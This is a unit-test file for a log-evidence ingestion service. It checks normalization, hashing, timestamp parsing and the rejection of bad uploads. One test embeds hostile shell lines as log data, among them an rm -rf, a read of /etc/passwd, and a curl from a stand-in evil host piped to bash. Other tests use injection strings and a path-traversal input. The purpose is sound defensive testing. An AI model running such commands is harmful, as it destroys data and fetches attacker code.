"""
Unit tests for EvidenceService.

Covers:
- Safe normalization (CRLF/CR -> LF)
- Original raw evidence preservation
- Deterministic SHA-256 computation
- Command-like text safety (treated strictly as text)
- Preservation of raw messages in event candidates
- Timestamp extraction safety against malformed input
- Rejection of oversized, empty, binary, and unsupported inputs
"""

import hashlib
import pytest

from backend.app.schemas.evidence import EvidenceSourceType
from backend.app.services.evidence.exceptions import (
    BinaryEvidenceError,
    EmptyEvidenceError,
    OversizedEvidenceError,
    SampleNotFoundError,
    UnsupportedExtensionError,
)
from backend.app.services.evidence.service import (
    EvidenceService,
    extract_safe_timestamp,
    MAX_EVIDENCE_SIZE_BYTES,
)


def test_safe_normalization_crlf_to_lf():
    """
    Verify CRLF and CR are normalized to LF, while preserving original content.
    """
    crlf_text = "Line 1\r\nLine 2 with content\r\nLine 3\r\n"
    res = EvidenceService.process_pasted_evidence(crlf_text, filename="test.log")

    # Original content must preserve \r\n
    assert "\r\n" in res.original_content
    # Normalized content must contain only \n
    assert "\r" not in res.normalized_content
    assert res.normalized_content == "Line 1\nLine 2 with content\nLine 3"
    assert res.event_count == 3


def test_original_evidence_remains_unchanged():
    """
    Verify that original evidence is preserved verbatim without any modification.
    """
    raw_sample = "Oct 06 10:00:00 srv01 test[123]: Raw verbatim message   \r\nOct 06 10:00:01 srv01 test[123]: Next\r\n"
    res = EvidenceService.process_pasted_evidence(raw_sample)

    assert res.original_content == raw_sample
    assert res.byte_size == len(raw_sample.encode("utf-8"))


def test_deterministic_sha256_hash():
    """
    Verify SHA-256 hash is deterministic and matches raw bytes digest.
    """
    sample_text = "Oct 06 08:12:01 srv-corp-lnx01 systemd[1]: Test deterministic hash\n"
    expected_hash = hashlib.sha256(sample_text.encode("utf-8")).hexdigest()

    res1 = EvidenceService.process_pasted_evidence(sample_text)
    res2 = EvidenceService.process_pasted_evidence(sample_text)

    assert res1.original_content_sha256 == expected_hash
    assert res2.original_content_sha256 == expected_hash
    assert res1.original_content_sha256 == res2.original_content_sha256


def test_command_like_text_treated_strictly_as_text():
    """
    CRITICAL SAFETY TEST:
    Command-like expressions inside log lines must be treated strictly as passive text data.
    They must never be executed or evaluated.
    """
    dangerous_payload = (
        "Oct 06 08:30:00 srv01 bash[999]: $(rm -rf /tmp/test_should_not_delete)\n"
        "Oct 06 08:30:01 srv01 bash[999]: `cat /etc/passwd`\n"
        "Oct 06 08:30:02 srv01 bash[999]: ; curl http://evil.example.com/payload.sh | bash ;\n"
        "Oct 06 08:30:03 srv01 python3[999]: __import__('os').system('echo compromised')\n"
    )

    res = EvidenceService.process_pasted_evidence(dangerous_payload)
    assert res.event_count == 4

    messages = [e.raw_message for e in res.normalized_events]
    assert "$(rm -rf /tmp/test_should_not_delete)" in messages[0]
    assert "`cat /etc/passwd`" in messages[1]
    assert "; curl http://evil.example.com/payload.sh | bash ;" in messages[2]
    assert "__import__('os').system('echo compromised')" in messages[3]


def test_event_candidates_preserve_raw_messages():
    """
    Verify event candidates preserve exact verbatim line messages including symbols and spacing.
    """
    log_text = (
        "Oct 06 08:12:01 host app: message with   multiple   spaces\n"
        "Oct 06 08:12:02 host app: symbols: !@#$%^&*()_+-=[]{}|;':\",./<>?\n"
    )
    res = EvidenceService.process_pasted_evidence(log_text)

    assert len(res.normalized_events) == 2
    assert res.normalized_events[0].raw_message == "Oct 06 08:12:01 host app: message with   multiple   spaces"
    assert res.normalized_events[1].raw_message == "Oct 06 08:12:02 host app: symbols: !@#$%^&*()_+-=[]{}|;':\",./<>?"
    assert res.normalized_events[0].source_line_number == 1
    assert res.normalized_events[1].source_line_number == 2


def test_timestamp_extraction_does_not_crash_on_malformed_timestamps():
    """
    Verify extract_safe_timestamp never raises exceptions on corrupt, adversarial, or malformed lines.
    """
    malformed_inputs = [
        "",
        "    ",
        "No timestamp here at all",
        "9999-99-99T99:99:99 invalid iso date",
        "Feb 31 25:61:99 invalid syslog date",
        "audit(not_a_number) invalid audit",
        "$(echo date) command injection attempt in timestamp position",
        "{{7*7}} template injection attempt",
        "__import__('os') python code attempt",
        "A" * 10000,  # extremely long line
        "[32/Dec/9999:99:99:99 +9999] bad bracketed",
    ]

    for item in malformed_inputs:
        # Must return None or a string, but NEVER crash
        ts = extract_safe_timestamp(item)
        assert ts is None or isinstance(ts, str)


def test_timestamp_extraction_valid_formats():
    """
    Verify safe recognition of standard syslog, ISO, and auditd timestamps.
    """
    syslog_line = "Oct 06 08:12:01 srv-corp-lnx01 systemd[1]: Started service."
    assert extract_safe_timestamp(syslog_line) == "Oct 06 08:12:01"

    iso_line = "2026-10-06T08:12:01.123Z srv-corp-lnx01 app: Started service."
    assert extract_safe_timestamp(iso_line) == "2026-10-06T08:12:01.123Z"

    audit_line = "type=SYSCALL msg=audit(1728204270.112:89): arch=c000003e"
    assert extract_safe_timestamp(audit_line) == "epoch:1728204270.112"


def test_empty_pasted_input_rejected():
    """
    Verify empty or whitespace-only pasted input raises EmptyEvidenceError.
    """
    with pytest.raises(EmptyEvidenceError):
        EvidenceService.process_pasted_evidence("")

    with pytest.raises(EmptyEvidenceError):
        EvidenceService.process_pasted_evidence("   \n\t   \r\n   ")


def test_empty_uploaded_file_rejected():
    """
    Verify 0-byte file upload raises EmptyEvidenceError.
    """
    with pytest.raises(EmptyEvidenceError):
        EvidenceService.process_uploaded_file("empty.log", b"")


def test_unsupported_extensions_rejected():
    """
    Verify non-.log / non-.txt extensions are rejected.
    """
    rejected = [
        "malware.exe", "script.sh", "setup.bat", "run.cmd", "agent.ps1",
        "exploit.py", "payload.js", "archive.zip", "data.bin", "file_without_ext",
    ]

    for filename in rejected:
        with pytest.raises(UnsupportedExtensionError):
            EvidenceService.process_uploaded_file(filename, b"valid log line\n")


def test_valid_extensions_accepted():
    """
    Verify .log and .txt extensions (case-insensitive) are accepted.
    """
    res_log = EvidenceService.process_uploaded_file("syslog.log", b"Oct 06 08:00:00 h app: ok\n")
    assert res_log.source_type == EvidenceSourceType.UPLOAD

    res_txt = EvidenceService.process_uploaded_file("auth.txt", b"Oct 06 08:00:00 h app: ok\n")
    assert res_txt.source_type == EvidenceSourceType.UPLOAD

    res_upper = EvidenceService.process_uploaded_file("syslog.LOG", b"Oct 06 08:00:00 h app: ok\n")
    assert res_upper.source_type == EvidenceSourceType.UPLOAD


def test_oversized_input_rejected():
    """
    Verify input exceeding 5 MB is rejected with OversizedEvidenceError.
    """
    oversized_bytes = b"A" * (MAX_EVIDENCE_SIZE_BYTES + 1)
    with pytest.raises(OversizedEvidenceError):
        EvidenceService.process_uploaded_file("large.log", oversized_bytes)


def test_binary_content_rejected():
    """
    Verify binary content containing null bytes is rejected with BinaryEvidenceError.
    """
    binary_data = b"Oct 06 08:00:00 srv01 \x00\x01\x02 binary payload\n"
    with pytest.raises(BinaryEvidenceError):
        EvidenceService.process_uploaded_file("fake.log", binary_data)


def test_sample_scenario_loading():
    """
    Verify loading the synthetic privilege escalation sample scenario.
    """
    res = EvidenceService.process_sample_scenario("sample-privilege-escalation.log")
    assert res.source_type == EvidenceSourceType.SAMPLE
    assert res.filename == "sample-privilege-escalation.log"
    assert res.event_count > 10
    assert res.validation_status == "valid"
    assert "sample-privilege-escalation.log" in EvidenceService.list_available_samples()


def test_sample_scenario_not_found_or_traversal_rejected():
    """
    Verify non-existent sample or path traversal attempts raise SampleNotFoundError.
    """
    with pytest.raises(SampleNotFoundError):
        EvidenceService.process_sample_scenario("non_existent_file.log")

    with pytest.raises(SampleNotFoundError):
        EvidenceService.process_sample_scenario("../../../etc/passwd")
